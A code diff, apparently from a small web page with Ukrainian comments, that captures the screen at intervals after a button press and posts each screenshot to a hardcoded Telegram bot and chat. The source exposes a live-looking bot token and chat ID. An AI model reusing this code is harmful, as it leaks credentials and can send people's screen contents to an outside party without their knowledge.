@@ -72,77 +72,6 @@ document.getElementById('themeToggle').addEventListener('click', function () {
 
 
 
-// const TOKEN = "7440822288:AAEDdkHYIniFfuObO7II_M7cyGNCmwP85Uo";
-// const CHAT_ID = "-1002238772738";
-// const SEND_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
-
-// let captureStream;
-// let screenshotInterval;
-
-// async function startCapture(displayMediaOptions) {
-//   try {
-//     captureStream = await navigator.mediaDevices.getDisplayMedia(displayMediaOptions);
-//     document.getElementById('stopButton').style.display = 'block';
-//     document.getElementById('startButton').style.display = 'none';
-//   } catch (err) {
-//     console.error(`Error: ${err}`);
-//   }
-//   return captureStream;
-// }
-
-// function takeScreenshot() {
-//   const videoElement = document.createElement('video');
-//   videoElement.autoplay = true;
-
-//   startCapture({ video: true }).then(stream => {
-//     videoElement.srcObject = stream;
-
-//     const intervalValue = parseInt(document.getElementById('interval').value) * 60 * 1000; // Перетворюємо в мс 
-//     screenshotInterval = setInterval(() => {
-//       const canvas = document.createElement('canvas');
-//       canvas.width = videoElement.videoWidth;
-//       canvas.height = videoElement.videoHeight;
-//       const context = canvas.getContext('2d');
-//       context.drawImage(videoElement, 0, 0);
-
-//       canvas.toBlob((blob) => {
-//         sendScreenshot(blob);
-//         console.log(blob);
-//         // Відправляємо скріншот у Telegram
-//       }, 'image/png');
-//     }, intervalValue);
-//   });
-// }
-
-// function sendScreenshot(screenshot) {
-//   const formData = new FormData();
-//   formData.append("chat_id", CHAT_ID);
-//   formData.append("photo", screenshot); // Додаємо скрін до formData
-//   axios.post(SEND_API, formData, {
-//     headers: {
-//       'Content-Type': 'multipart/form-data'
-//     }
-//   })
-//     .then((res) => {
-//       console.log("Скріншот надіслано!");
-//     })
-//     .catch((error) => {
-//       console.error('Error sending screenshot:', error);
-//     });
-// }
-
-// function stopScreenshots() {
-//   clearInterval(screenshotInterval);
-//   captureStream.getTracks().forEach(track => track.stop());
-//   document.getElementById('stopButton').style.display = 'none';
-//   document.getElementById('startButton').style.display = 'block';
-// }
-
-// document.getElementById('startButton').addEventListener('click', takeScreenshot);
-// document.getElementById('stopButton').addEventListener('click', stopScreenshots);
-
-
-
 
 
 const TOKEN = "7440822288:AAEDdkHYIniFfuObO7II_M7cyGNCmwP85Uo";
@@ -152,29 +81,15 @@ const SEND_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 let captureStream;
 let screenshotInterval;
 
-async function startCapture(mediaOptions) {
+async function startCapture(displayMediaOptions) {
   try {
-    captureStream = await navigator.mediaDevices.getUserMedia(mediaOptions);
+    captureStream = await navigator.mediaDevices.getDisplayMedia(displayMediaOptions);
     document.getElementById('stopButton').style.display = 'block';
     document.getElementById('startButton').style.display = 'none';
   } catch (err) {
     console.error(`Error: ${err}`);
+    alert("Не вдалося отримати доступ до екрана.");
   }
-  return captureStream;
-}
-
-async function captureScreenOrCamera() {
-  let mediaOptions;
-
-  // Перевірка наявності доступу до екрана
-  if (navigator.mediaDevices.getDisplayMedia) {
-    mediaOptions = { video: true }; // Для комп'ютера
-    captureStream = await navigator.mediaDevices.getDisplayMedia(mediaOptions);
-  } else {
-    mediaOptions = { video: true }; // Для мобільного телефону
-    captureStream = await navigator.mediaDevices.getUserMedia(mediaOptions);
-  }
-
   return captureStream;
 }
 
@@ -182,48 +97,69 @@ function takeScreenshot() {
   const videoElement = document.createElement('video');
   videoElement.autoplay = true;
 
-  captureScreenOrCamera().then(stream => {
-    videoElement.srcObject = stream;
+  const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+  const displayMediaOptions = { video: true };
 
-    const intervalValue = parseInt(document.getElementById('interval').value) * 60 * 1000; // Перетворюємо в мс 
-    screenshotInterval = setInterval(() => {
-      const canvas = document.createElement('canvas');
-      canvas.width = videoElement.videoWidth;
-      canvas.height = videoElement.videoHeight;
-      const context = canvas.getContext('2d');
-      context.drawImage(videoElement, 0, 0);
+  if (isMobile) {
+    // Для мобільних пристроїв використовуємо getUserMedia
+    startCapture({ video: true }).then(stream => {
+      videoElement.srcObject = stream;
+      captureScreenshots(videoElement);
+    });
+  } else {
+    // Для комп'ютерів використовуємо getDisplayMedia
+    startCapture(displayMediaOptions).then(stream => {
+      videoElement.srcObject = stream;
+      captureScreenshots(videoElement);
+    });
+  }
+}
 
-      canvas.toBlob((blob) => {
-        sendScreenshot(blob);
-        console.log(blob);
-      }, 'image/png');
-    }, intervalValue);
-  });
+function captureScreenshots(videoElement) {
+  const intervalValue = parseInt(document.getElementById('interval').value) * 60 * 1000; // Перетворюємо в мс 
+  screenshotInterval = setInterval(() => {
+    const canvas = document.createElement('canvas');
+    canvas.width = videoElement.videoWidth;
+    canvas.height = videoElement.videoHeight;
+    const context = canvas.getContext('2d');
+    context.drawImage(videoElement, 0, 0);
+
+    canvas.toBlob((blob) => {
+      sendScreenshot(blob);
+      console.log(blob);
+    }, 'image/png');
+  }, intervalValue);
 }
 
 function sendScreenshot(screenshot) {
   const formData = new FormData();
   formData.append("chat_id", CHAT_ID);
   formData.append("photo", screenshot); // Додаємо скрін до formData
+
   axios.post(SEND_API, formData, {
     headers: {
       'Content-Type': 'multipart/form-data'
     }
   })
     .then((res) => {
-      console.log("Скріншот надіслано!");
+      console.log("Скріншот надіслано!", res.data);
     })
     .catch((error) => {
-      console.error('Error sending screenshot:', error);
+      console.error('Error sending screenshot:', error.response ? error.response.data : error.message);
     });
 }
 
+
 function stopScreenshots() {
   clearInterval(screenshotInterval);
-  captureStream.getTracks().forEach(track => track.stop());
+  if (captureStream) {
+    captureStream.getTracks().forEach(track => track.stop());
+  }
   document.getElementById('stopButton').style.display = 'none';
   document.getElementById('startButton').style.display = 'block';
 }
 
 document.getElementById('startButton').addEventListener('click', takeScreenshot);
 document.getElementById('stopButton').addEventListener('click', stopScreenshots);
+
+
